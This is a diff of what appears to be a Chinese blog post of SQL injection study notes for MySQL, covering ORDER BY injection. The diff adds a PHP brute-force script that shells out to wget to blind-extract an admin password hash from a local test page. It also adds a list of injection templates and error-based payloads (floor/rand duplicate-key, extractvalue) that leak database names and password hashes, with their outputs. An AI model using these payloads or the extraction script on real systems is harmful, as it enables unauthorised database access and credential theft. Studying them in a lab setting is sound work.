@@ -14,8 +14,7 @@ tags:
 {% raw %}
 <pre>
 order by 字段1,字段2 DESC  字段1是排序第一关键字，默认为升序;字段2是排序第二关键字,这里指定为降序
-order by apples,IF(1,bananas,cherries) desc
-order by apples,(case when 1 then bananas else cherries end) desc
+字段2处替换为： IF(1,bananas,cherries) 或 (case when 1 then bananas else cherries end)
 
 ASCII(SUBSTRING((SELECT password FROM fruits WHERE username = 0x41646d696e),1,1))=0x30
 </pre>
@@ -53,6 +52,29 @@ for i in range(1,33):
             break
 print AdminHash
 {% endhighlight %}
+
+php爆破脚本：
+{% highlight php %}
+<?php
+$md5 = '';
+$foo = array('0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f');
+for($i=1; $i <= 32; $i++)
+{
+        foreach($foo as $s)
+        {
+           $s = ord($s);                
+           $res = system("wget -O - 'http://192.168.1.100/DebugPHP/3.php?by=IF(SUBSTR((SELECT password from fruits WHERE username=CHAR(65,100,109,105,110)),{$i},1)=CHAR({$s}),username,password) LIMIT 2--' 2>/dev/null | grep Admin");
+                if('' != $res)
+                {
+                    $md5 .= chr($s);
+                    break; 
+                 }
+        }
+}
+echo "===$md5===";
+?>
+{% endhighlight %}
+
 
 php本地注入测试脚本
 {% highlight php %}
@@ -151,11 +173,6 @@ insert into fruits values ('Harald5','e10adc3949ba59abbe56e057f20f903e',5,5,5);
 其他注入知识点：
 {% raw %}
 <pre>
-mysql> select flag from flag where flag='' and (select 1 FROM(select count(*),concat((select (select concat(database())) FROM information_schema.tables LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a) and '';
-ERROR 1062 (23000): Duplicate entry 'security1' for key 'group_key'
-
-update users set password='',password=(select email_id from emails limit 0,1) where username='admin4';
-
 ''=(payload)=''
 ' or (payload) or '
 ' and (payload) and '
@@ -164,6 +181,23 @@ update users set password='',password=(select email_id from emails limit 0,1) wh
 '*  (payload)  *'
 ' or (payload) and '
 " – (payload) – "
+
+select flag from flag where flag='' and (select 1 FROM(select count(*),concat((select (select concat(database())) FROM information_schema.tables LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a) and '';
+//Duplicate entry 'security1' for key 'group_key'
+
+update users set password='',password=(select email_id from emails limit 0,1) where username='admin4';
+
+order by apples,IF(1,bananas,cherries) desc
+order by apples,(case when 1 then bananas else cherries end) desc
+
+order by 1 and extractvalue(0,concat(0x3a,mid((select password from fruits where username='Admin'),1,16)));
+//XPATH syntax error: ':e10adc3949ba59ab'  爆出前16位
+order by 1 and extractvalue(0,concat(0x3a,mid((select password from fruits where username='Admin'),17,16)));
+//XPATH syntax error: ':be56e057f20f894e'  爆出后16位
+
+select * from fruits order by extractvalue(0,concat(0x3a,(select password from users where username='Dummy')));
+//XPATH syntax error: ':p@ssword' 可以爆出其他表中的字段值
+
 
 mysql常用命令：
 select hex('Admin');  /*41646D696E*/
